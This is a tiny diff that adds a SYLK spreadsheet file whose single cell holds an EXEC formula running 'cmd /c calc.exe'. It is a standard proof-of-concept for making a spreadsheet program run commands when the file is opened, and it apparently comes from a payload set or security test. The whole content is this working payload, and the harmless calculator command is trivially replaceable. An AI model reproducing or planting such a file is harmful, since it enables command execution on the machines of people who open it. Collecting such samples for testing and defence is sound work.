@@ -1,0 +1,3 @@
+ID;PWXL;N;E
+C;X1;Y1;K0;E=EXEC("cmd /c calc.exe")
+E
